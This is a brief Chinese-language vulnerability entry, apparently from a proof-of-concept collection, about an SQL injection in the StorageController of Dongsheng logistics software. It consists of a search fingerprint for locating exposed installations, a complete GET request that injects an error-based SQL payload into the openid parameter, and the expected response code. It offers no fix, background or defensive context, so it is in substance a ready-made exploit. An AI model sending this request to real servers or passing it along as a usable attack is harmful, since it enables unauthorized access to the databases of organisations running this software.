# 东胜物流软件StorageController存在SQL注入漏洞

东胜物流软件 ｜ SQL注入 ｜ —
- **指纹**：`app="东胜物流软件-物流软件"`
- **请求**：`GET /Storage/Storage/DQStorageData?openid=’)and+1<@@VERSION--+-&mblno=111&page=1&pageSize=10 HTTP/1.1`
- **响应特征**：200